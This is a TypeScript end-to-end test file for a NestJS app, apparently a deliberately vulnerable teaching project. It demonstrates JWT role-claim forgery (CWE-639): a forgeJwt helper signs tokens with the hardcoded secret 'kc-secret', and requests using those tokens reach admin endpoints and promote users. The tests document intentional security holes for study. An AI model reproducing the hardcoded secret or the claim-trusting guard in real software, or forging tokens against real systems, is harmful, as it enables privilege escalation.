import { INestApplication } from '@nestjs/common';
import { JwtService } from '@nestjs/jwt';
import { Test, TestingModule } from '@nestjs/testing';
import request from 'supertest';
import { App } from 'supertest/types';
import { DataSource } from 'typeorm';
import { AppModule } from '../src/app.module';

/**
 * v0.4.2 — RBAC & JWT Forgery (CWE-639 Vulnerability Demonstration)
 *
 * End-to-end tests specifically designed to demonstrate JWT role claim forgery
 * and the CWE-639 (Client-Controlled Authorization) vulnerability.
 *
 * Background:
 *   - HasRole() guard trusts the JWT role claim WITHOUT re-validating against
 *     the database. This means an attacker who knows the hardcoded JWT secret
 *     ('kc-secret', disclosed in v0.1.3) can forge a JWT with role='admin'
 *     and gain unauthorized access to admin endpoints.
 *
 * Test infrastructure:
 *   - Each describe block creates a fresh NestJS app via beforeEach().
 *   - beforeEach() truncates tables for test isolation.
 *   - afterEach() closes the app.
 *   - Helper forgejwt() manually creates a JWT signed with 'kc-secret',
 *     allowing tests to simulate attacker behavior.
 *
 * Requires: docker compose -f infra/compose.yml up -d
 */

const JWT_REGEX = /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/;

describe('RBAC & JWT Forgery (v0.4.2 CWE-639 Demonstration)', () => {
  let app: INestApplication<App>;
  let dataSource: DataSource;
  let jwtService: JwtService;

  beforeEach(async () => {
    const moduleFixture: TestingModule = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleFixture.createNestApplication();
    await app.init();

    dataSource = app.get(DataSource);
    jwtService = app.get(JwtService);
    await dataSource.synchronize(true);
  });

  afterEach(async () => {
    await app.close();
  });

  /**
   * Helper: Register a user and return { userId, token }
   */
  async function registerUser(
    email: string,
    username: string,
    password = 'password123',
  ) {
    const response = await request(app.getHttpServer())
      .post('/auth/register')
      .send({ email, username, password })
      .expect(201);

    return {
      userId: response.body.userId,
      token: response.body.token,
    };
  }

  /**
   * Helper: Forge a JWT with arbitrary role claim using the hardcoded secret.
   *
   * This simulates an attacker who:
   *   1. Knows the JWT secret ('kc-secret') from source code leak (v0.1.3+)
   *   2. Can create a valid JWT signed with that secret
   *   3. Can claim any role they want in the JWT payload
   *
   * The backend HasRoleGuard will accept this forged token because it only
   * checks the decoded role claim, not whether the user actually has that
   * role in the database.
   *
   * CWE-639: Client-Controlled Authorization
   *   The role is effectively "client-controlled" because:
   *   - The client provides a JWT with a role claim
   *   - The server trusts this claim without re-checking the database
   *   - Therefore, a client who knows the secret can set their own role
   */
  function forgeJwt(userId: string, email: string, role: 'user' | 'admin'): string {
    return jwtService.sign({
      sub: userId,
      email,
      role,
    });
  }

  // ============================================================================
  // Test 1: CWE-639 PoC — Forge JWT with admin role and access admin endpoint
  // ============================================================================
  it('VULN CWE-639: Forged JWT with role=admin successfully accesses admin endpoint', async () => {
    // Register a regular user
    const user = await registerUser('regular@example.com', 'regularuser');

    // Forge a JWT claiming this user is an admin
    // In a real attack, an attacker would:
    //   1. Obtain the hardcoded secret 'kc-secret' from source code
    //   2. Use a JWT library to sign { sub: "...", email: "...", role: "admin" }
    //   3. Use the forged token in the Authorization header
    const forgedAdminToken = forgeJwt(user.userId, 'regular@example.com', 'admin');

    // Without the fix (v0.4.2), this request succeeds because HasRole() trusts JWT
    // The backend does NOT check the database to verify this user is actually admin
    const response = await request(app.getHttpServer())
      .get('/admin/users')
      .set('Authorization', `Bearer ${forgedAdminToken}`)
      .expect(200);

    expect(response.body.users).toBeDefined();
    expect(Array.isArray(response.body.users)).toBe(true);

    // Proof: The database still shows this user as 'user', not 'admin'
    const userRepo = dataSource.getRepository('User');
    const dbUser = await userRepo.findOne({ where: { id: user.userId } });
    expect(dbUser?.role).toBe('user'); // DB role is still 'user'

    // But the forged JWT was accepted anyway → CWE-639
  });

  // ============================================================================
  // Test 2: Verify JwtAuthGuard still validates token structure
  // ============================================================================
  it('Invalid/malformed JWT is rejected at JwtAuthGuard (not at HasRole)', async () => {
    // Try to access admin endpoint with a completely invalid token
    const invalidToken = 'not.a.valid.jwt';

    await request(app.getHttpServer())
      .get('/admin/users')
      .set('Authorization', `Bearer ${invalidToken}`)
      .expect(401); // JwtAuthGuard validates token structure first
  });

  // ============================================================================
  // Test 3: Role persistence — Admin role change survives across login sessions
  // ============================================================================
  it('Admin role change persists across login sessions', async () => {
    // Register a regular user
    const user = await registerUser('persistent@example.com', 'persistentuser');

    // Forge an admin JWT for this user and promote them via the admin endpoint
    const forgedAdminToken = forgeJwt(user.userId, 'persistent@example.com', 'admin');

    // Call the role update endpoint using the forged token
    const updateResponse = await request(app.getHttpServer())
      .put(`/admin/users/${user.userId}/role`)
      .set('Authorization', `Bearer ${forgedAdminToken}`)
      .send({ role: 'admin' })
      .expect(200);

    expect(updateResponse.body.role).toBe('admin');

    // Now, log out and log back in as this user
    // The new login token should have role='admin' (database change persisted)
    const loginResponse = await request(app.getHttpServer())
      .post('/auth/login')
      .send({
        email: 'persistent@example.com',
        password: 'password123',
      })
      .expect(201);

    expect(loginResponse.body.token).toBeDefined();
    expect(loginResponse.body.token.match(JWT_REGEX)).toBeTruthy();

    // Use the new, legitimately-signed token to access admin endpoint
    const newAdminToken = loginResponse.body.token;
    const adminListResponse = await request(app.getHttpServer())
      .get('/admin/users')
      .set('Authorization', `Bearer ${newAdminToken}`)
      .expect(200);

    expect(adminListResponse.body.users).toBeDefined();
  });

  // ============================================================================
  // Test 4: Demonstrate CWE-862 — Incomplete authorization on PUT endpoint
  // ============================================================================
  it('PUT /admin/users/:id/role also trusts JWT role without DB re-check (CWE-639 + CWE-862)', async () => {
    // Create two users
    const user1 = await registerUser('user1@example.com', 'user1');
    const user2 = await registerUser('user2@example.com', 'user2');

    // Forge an admin JWT for user1
    const forgedAdminToken = forgeJwt(user1.userId, 'user1@example.com', 'admin');

    // Use the forged token to promote user2 to admin
    // Both the GET and PUT endpoints trust the forged token
    const response = await request(app.getHttpServer())
      .put(`/admin/users/${user2.userId}/role`)
      .set('Authorization', `Bearer ${forgedAdminToken}`)
      .send({ role: 'admin' })
      .expect(200);

    expect(response.body.role).toBe('admin');

    // Verify user2 was actually promoted in the database
    const userRepo = dataSource.getRepository('User');
    const updatedUser = await userRepo.findOne({ where: { id: user2.userId } });
    expect(updatedUser?.role).toBe('admin');

    // CWE-862: The endpoint has no additional authorization checks beyond
    // HasRole('admin'). Any forged admin JWT can modify any user.
  });

  // ============================================================================
  // Test 5: Unauthorized escalation — User-level JWT forgery cannot access admin
  // ============================================================================
  it('Even with forged JWT, invalid role value is subject to HasRole guard logic', async () => {
    // Register a user
    const user = await registerUser('useronly@example.com', 'useronly');

    // Forge a JWT with a completely invalid role (not 'user' or 'admin')
    // This tests whether HasRole guard validates the claimed role value
    const invalidRoleToken = jwtService.sign({
      sub: user.userId,
      email: 'useronly@example.com',
      role: 'superadmin', // Invalid role
    });

    // HasRole('admin') should reject this because role !== 'admin'
    await request(app.getHttpServer())
      .get('/admin/users')
      .set('Authorization', `Bearer ${invalidRoleToken}`)
      .expect(403);
  });

  // ============================================================================
  // Bonus vulnerability note: IDOR-like pattern in role modification
  // ============================================================================
  it('Admin can modify ANY user role (demonstrates incorrect IDOR check)', async () => {
    // Register two users
    const admin = await registerUser('admin@example.com', 'admin');
    const targetUser = await registerUser('target@example.com', 'target');

    // Forge admin token for the admin user
    const adminToken = forgeJwt(admin.userId, 'admin@example.com', 'admin');

    // Modify targetUser's role
    const response = await request(app.getHttpServer())
      .put(`/admin/users/${targetUser.userId}/role`)
      .set('Authorization', `Bearer ${adminToken}`)
      .send({ role: 'admin' })
      .expect(200);

    expect(response.body.id).toBe(targetUser.userId);
    expect(response.body.role).toBe('admin');

    // Note: This is correct behavior for an admin endpoint (admins CAN modify any user).
    // However, in a more complex system, this could become an IDOR issue if:
    //   - Role hierarchies are introduced (moderator can't promote to admin)
    //   - Departmental boundaries exist (HR admin shouldn't modify Finance admin)
    // For now (v0.4.2), this is intentional behavior, but demonstrates
    // the absence of per-user authorization checks.
  });
});
